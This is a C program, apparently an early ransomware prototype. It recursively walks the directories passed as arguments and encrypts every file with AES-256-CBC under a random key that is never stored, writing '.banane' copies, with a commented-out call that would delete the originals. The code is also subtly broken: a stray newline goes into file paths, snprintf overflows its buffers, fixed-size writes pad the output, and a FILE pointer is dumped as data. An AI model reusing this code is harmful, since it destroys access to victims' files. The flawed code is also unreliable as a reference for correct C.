#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>



    void handleErrors(void) {
        ERR_print_errors_fp(stderr);
        abort();
    }

    int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
                unsigned char *iv, unsigned char *ciphertext) {
        EVP_CIPHER_CTX *ctx;

        int len;

        int ciphertext_len;


        /* Create and initialise the context */
        if (!(ctx = EVP_CIPHER_CTX_new()))
            handleErrors();

        /*
         * Initialise the encryption operation. IMPORTANT - ensure you use a key
         * and IV size appropriate for your cipher
         * In this example we are using 256 bit AES (i.e. a 256 bit key). The
         * IV size for *most* modes is the same as the block size. For AES this
         * is 128 bits
         */
        if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
            handleErrors();

        /*
         * Provide the message to be encrypted, and obtain the encrypted output.
         * EVP_EncryptUpdate can be called multiple times if necessary
         */
        if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
            handleErrors();
        ciphertext_len = len;

        /*
         * Finalise the encryption. Further ciphertext bytes may be written at
         * this stage.
         */
        if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
            handleErrors();
        ciphertext_len += len;

        /* Clean up */
        EVP_CIPHER_CTX_free(ctx);

        return ciphertext_len;
    }

    int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
                unsigned char *iv, unsigned char *plaintext) {
        EVP_CIPHER_CTX *ctx;

        int len;

        int plaintext_len;

        /* Create and initialise the context */
        if (!(ctx = EVP_CIPHER_CTX_new()))
            handleErrors();

        /*
         * Initialise the decryption operation. IMPORTANT - ensure you use a key
         * and IV size appropriate for your cipher
         * In this example we are using 256 bit AES (i.e. a 256 bit key). The
         * IV size for *most* modes is the same as the block size. For AES this
         * is 128 bits
         */
        if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
            handleErrors();

        /*
         * Provide the message to be decrypted, and obtain the plaintext output.
         * EVP_DecryptUpdate can be called multiple times if necessary.
         */
        if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
            handleErrors();
        plaintext_len = len;

        /*
         * Finalise the decryption. Further plaintext bytes may be written at
         * this stage.
         */
        if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
            handleErrors();
        plaintext_len += len;

        /* Clean up */
        EVP_CIPHER_CTX_free(ctx);

        return plaintext_len;
    }

#define KEY_SIZE 32
#define IV_SIZE 16

void list_dir(const char *path) {

    DIR *directory;
    FILE *fp, *fp_out, *fp_dec;
    struct dirent *entry;
    directory = opendir(path);
    printf("Reading files in: %s\n", path);

    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];

    RAND_bytes(key, KEY_SIZE);
    RAND_bytes(iv, IV_SIZE);

    while ((entry = readdir(directory)) != NULL) {

        char *file = entry->d_name;

        if (entry->d_type == DT_DIR && strcmp(file, ".") != 0 && strcmp(file, "..") != 0) {
            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
            char *buffer = (char *) malloc(lenght * sizeof(char));
            if (buffer != NULL) {
                snprintf(buffer, lenght, "%s/%s", path, file);
                list_dir(buffer);
                free(buffer);
            }
        } else if (strcmp(file, ".") != 0 && strcmp(file, "..") != 0) {
            printf("%s/%s\n", path, file);
            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
            char *buffer = (char *) malloc(lenght * sizeof(char));
            char *buffer_out = (char *) malloc(lenght * sizeof(char));
            char *buffer_dcrpt = (char *) malloc(lenght * sizeof(char));
            if (buffer != NULL) {
                snprintf(buffer, lenght, "%s/%s\n", path, file);

                if (buffer == NULL) {
                    printf("No file\n");
                }

                printf("Opening %s \n", buffer);
                fp = fopen(buffer, "r+");
                snprintf(buffer_out, lenght+14, "%s/%s.banane", path, file);
                snprintf(buffer_dcrpt, lenght+14, "%s/%s.dec", path, file);
                fp_out = fopen(buffer_out, "w+");
                fp_dec = fopen(buffer_dcrpt, "w+");

                if (fp == NULL) {
                    printf("Can't open file\n");
                } else {
                    unsigned char text_in_file[1024];
                    unsigned char enc_text_in_file[1024];
                    printf("buffer avant -> %s\n", buffer);
                    int read_file_len;
                    printf("buffer après -> %s\n", buffer);
                    while ((read_file_len = fread(text_in_file, sizeof(unsigned char), 1024, fp)) != 0) {
                        int file_crypted_len = encrypt(text_in_file, read_file_len, key, iv, enc_text_in_file);
                        fwrite(enc_text_in_file, sizeof (unsigned char), 1024, fp_out);
                        BIO_dump_fp(stdout, (const char *) fp, file_crypted_len);
                        
                        //remove(buffer);
                        printf("entrée : %s\n", buffer);
                        printf("sortie : %s\n", buffer_out);

                    }

                }


            }

        }


    }closedir(directory);

}

    int main(int argc, char *argv[]) {

        printf("%d arguments \n", argc - 1);

        for (int i = 1; i < argc; i++) {
            printf("Path : %s\n", argv[i]);
            if (strlen(argv[i]) <= PATH_MAX) {
                list_dir(argv[i]);
            }
        }

        /*
        * Set up the key and iv. Do I need to say to not hard code these in a
        * real application?:-)
        */

        unsigned char key[KEY_SIZE];
        unsigned char iv[IV_SIZE];

        RAND_bytes(key, KEY_SIZE);
        RAND_bytes(iv, IV_SIZE);

        /* Message to be encrypted */
        unsigned char *plaintext =
                (unsigned char *) "Text with phrases and word !";

        /*
         * Buffer for ciphertext. Ensure the buffer is long enough for the
         * ciphertext which may be longer than the plaintext, depending on the
         * algorithm and mode.
         */
        unsigned char ciphertext[128];

        /* Buffer for the decrypted text */
        unsigned char decryptedtext[128];

        int decryptedtext_len, ciphertext_len;

        /* Encrypt the plaintext */
        ciphertext_len = encrypt(plaintext, strlen((char *) plaintext), key, iv,
                                 ciphertext);

        /* Do something useful with the ciphertext here */
        printf("Ciphertext is:\n");
        BIO_dump_fp(stdout, (const char *) ciphertext, ciphertext_len);

        /* Decrypt the ciphertext */
        decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv,
                                    decryptedtext);

        /* Add a NULL terminator. We are expecting printable text */
        decryptedtext[decryptedtext_len] = '\0';

        /* Show the decrypted text */
        printf("Decrypted text is:\n");
        printf("%s\n", decryptedtext);

        return (0);
    }